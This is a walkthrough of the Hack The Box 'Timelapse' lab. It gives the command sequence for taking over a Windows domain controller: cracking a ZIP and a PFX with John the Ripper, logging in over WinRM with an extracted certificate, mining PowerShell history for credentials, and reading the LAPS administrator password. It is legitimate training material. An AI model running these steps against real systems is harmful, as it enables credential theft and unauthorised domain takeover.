## Overview

This walkthrough covers the **Timelapse** Hack The Box (HTB) lab, which focuses on exploiting a Windows Active Directory environment using enumeration, password cracking, and privilege escalation techniques. The main attack path involves:

- Discovering a publicly accessible SMB share,
- Extracting a password-protected ZIP file containing a PFX certificate,
- Cracking the ZIP and PFX passwords using John the Ripper,
- Extracting an SSL certificate and private key from the PFX file,
- Using the certificate and key to authenticate via WinRM,
- Performing PowerShell history enumeration to find new credentials,
- Exploiting LAPS (Local Administrator Password Solution) permissions to fetch the Administrator password, 
- Gaining Administrator access on the domain controller.

## Recon and Port Scanning

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.227.113 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -SC -sv 10.129.227.113
```
- Perform full port scan and scan only open ports with service detection.

---

## Enumerating SMB Shares
```
smbclient -L //10.129.227.113/
smbclient //10.129.227.113/Shares
```
- List SMB shares, then connect to the "Shares" share.

Within the SMB client:

```
ls
cd Dev
get winrm_backup.zip
```
- List files in the share, navigate to Dev folder, and download the `winrm_backup.zip`.

---

## Cracking ZIP Password

```
zip2john winrm_backup.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
```
- Convert ZIP to John-compatible hash and crack password using rockyou.txt wordlist.

---

## Extracting PFX File

`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes`
- Attempt to extract private key (initially fails due to unknown password).

---

## Cracking PFX Password

```
python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
```
- Convert PFX to a hash and crack password using John the Ripper.

---

## Extracting SSL Certificate and Private Key

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```
- Extract the private key (unencrypted) and the SSL certificate separately now that the password is known.

---

## Authentication via WinRM with Evil-WinRM

`evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S`
- Authenticate to the WinRM SSL service using the extracted cert and private key, skipping SSL certificate verification.

---

## PowerShell History Enumeration

`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- View PowerShell command history retrieved to discover new credentials.

---

## Login with `svc_deploy` User

```
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
```
- Login as `svc_deploy` using found credentials and check the group memberships.

---

## LAPS Password Extraction

`Get-ADComputer DC01 -property 'ms-mcs-admpwd'`
- Retrieve the current local Administrator password for DC01 computer managed by LAPS.

---

## Administrator Access

`evil-winrm -i 10.129.227.113 -u administrator -p '72)9j8++KMk(38d9sAgO+k9N' -S`
- Use the retrieved LAPS-managed password to login as Administrator and gain full access.

## Tools Utilized

- **John the Ripper**: For cracking ZIP and PFX passwords.
- **OpenSSL**: To extract certificates and keys from PFX files.
- **Evil-WinRM**: For remote Windows management via PowerShell and WinRM.

---

**Note:** 

-  The `.pfx` file contains cryptographic assets (SSL certificate + private key) for authentication.
-  LAPS (Local Administrator Password Solution) securely manages local account passwords of domain-joined computers and stores them in Active Directory.
